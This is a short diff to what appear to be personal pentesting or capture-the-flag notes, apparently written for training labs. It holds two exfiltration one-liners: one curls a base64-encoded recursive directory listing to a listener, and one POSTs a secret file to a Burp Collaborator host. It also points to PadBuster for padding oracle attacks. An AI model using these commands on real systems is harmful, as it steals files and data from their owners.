@@ -306,6 +306,10 @@ this will exfiltrate command outputs if all you have is the ability to make web 
 
 `ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`
 
+if you have a server or burp collaborator-like functionality, you can retrieve posted files via:
+
+`curl -X POST -F test=@/home/carlos/secret http://pohwe4zygesamfa7r5y0nutip9v1jq.burpcollaborator.net`
+
 ## Padding oracle attacks
 
 use https://github.com/AonCyberLabs/PadBuster
